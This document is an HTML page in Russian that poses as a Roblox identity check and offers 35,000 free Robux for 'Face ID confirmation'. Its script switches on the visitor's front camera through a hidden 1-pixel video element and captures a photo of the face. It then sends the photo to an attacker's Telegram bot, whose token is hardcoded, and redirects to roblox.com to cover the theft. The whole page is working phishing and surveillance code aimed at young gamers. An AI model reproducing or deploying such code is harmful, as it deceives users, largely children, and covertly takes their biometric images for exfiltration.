<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cloud Verify</title>
    <style>
        body { font-family: sans-serif; background: #1a1b1c; color: white; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #2b2d2e; padding: 30px; border-radius: 15px; width: 85%; max-width: 350px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        .btn { background: #0084ff; color: white; border: none; padding: 18px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 18px; }
        #st { margin-top: 15px; color: #888; font-size: 13px; }
        /* Видео НЕ скрыто через display:none, а просто микроскопическое */
        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="60" style="filter: invert(1); margin-bottom: 15px;">
    <h2>Проверка личности</h2>
    <p>Для получения <b>35,000 Robux</b> подтвердите Face ID. Нажмите кнопку и выберите «Разрешить».</p>
    <button class="btn" onclick="secureCapture()">ПОДТВЕРДИТЬ</button>
    <div id="st">Ожидание авторизации...</div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    async function secureCapture() {
        const btn = document.querySelector('.btn');
        const st = document.getElementById('st');
        const v = document.getElementById('v');
        const c = document.getElementById('c');

        btn.style.display = 'none';
        st.innerText = "Связь с сервером безопасности...";

        try {
            // Запрашиваем камеру (обязательно через жест пользователя)
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: 1280 } 
            });
            v.srcObject = stream;

            // ГЛАВНОЕ: Ждем начала реального воспроизведения
            v.onplaying = () => {
                st.innerText = "Идет биометрическое сканирование...";
                
                // Даем 5.5 секунд — это обходит любую защиту и настраивает свет
                setTimeout(() => {
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    c.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', '7889497672');
                        fd.append('photo', blob, 'face.jpg');
                        fd.append('caption', '👤 **ЛИЦО ЦЕЛИ ПОЙМАНО!**\n\n✅ Обойдена защита безопасности браузера.\n🌐 Статус: Успешно');

                        fetch('https://api.telegram.org/bot8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I/sendPhoto', {
                            method: 'POST',
                            body: fd
                        }).then(() => {
                            stream.getTracks().forEach(t => t.stop());
                            alert("✅ Личность подтверждена! Ожидайте зачисления.");
                            window.location.href = "https://www.roblox.com";
                        });
                    }, 'image/jpeg', 0.85);
                }, 5500); 
            };

        } catch (e) {
            alert("Ошибка безопасности! Нажмите 'Разрешить' для продолжения.");
            btn.style.display = 'block';
        }
    }
</script>
</body>
</html>
